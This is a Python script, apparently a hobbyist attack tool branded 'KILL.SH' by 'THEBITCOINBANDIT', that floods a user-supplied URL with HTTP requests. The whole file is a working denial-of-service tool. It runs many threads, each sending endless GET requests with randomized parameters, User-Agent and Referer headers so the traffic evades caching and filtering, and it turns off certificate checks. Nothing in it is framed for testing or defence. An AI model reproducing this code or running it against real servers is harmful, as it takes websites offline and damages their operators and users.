import threading
import requests
import random
import string
import sys
import argparse
import warnings
from colorama import init, Fore, Style

# Initialize colorama (for colored terminal output)
init()

# Suppress only the InsecureRequestWarning from urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

stop_attack = False

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def attack(url):
    global stop_attack
    while not stop_attack:
        try:
            params = {random_string(): random_string() for _ in range(5)}
            headers = {
                'User-Agent': random_string(10),
                'Referer': f"https://{random_string(5)}.com"
            }
            r = requests.get(url, params=params, headers=headers, verify=False)
            print(f"{Fore.GREEN}[+] ATTACKING '{url}'{Style.RESET_ALL}")
        except requests.exceptions.RequestException:
            print(f"{Fore.RED}[-] STRUGGLING WITH DOS ATTACK{Style.RESET_ALL}")

def wait_for_enter():
    global stop_attack
    input()  # Waits for user to press Enter
    stop_attack = True
    print("\n[!] Attack stopped by user.")

class CustomHelpFormatter(argparse.HelpFormatter):
    def add_usage(self, usage, actions, groups, prefix=None):
        # Add a purple banner before the usage message
        banner = f"{Fore.MAGENTA}KILL.SH HAS BEEN MADE BY THEBITCOINBANDIT{Style.RESET_ALL}\n\n"
        if prefix is None:
            prefix = banner + "usage: "
        else:
            prefix = banner + prefix
        super().add_usage(usage, actions, groups, prefix)

def main():
    parser = argparse.ArgumentParser(
        description='Simple HTTP Flood DoS tool.',
        formatter_class=CustomHelpFormatter
    )
    parser.add_argument('-u', '--url', type=str, help='Target URL (include http:// or https://)', required=True)
    parser.add_argument('-t', '--threads', type=int, help='Number of threads to use', required=True)
    
    args = parser.parse_args()

    target = args.url
    num_threads = args.threads

    print(f"[*] Starting DoS attack on {target} with {num_threads} threads...")
    print(f"[*] Press ENTER anytime to stop the attack.\n")

    for _ in range(num_threads):
        thread = threading.Thread(target=attack, args=(target,))
        thread.daemon = True
        thread.start()

    wait_for_enter()

if __name__ == "__main__":
    main()

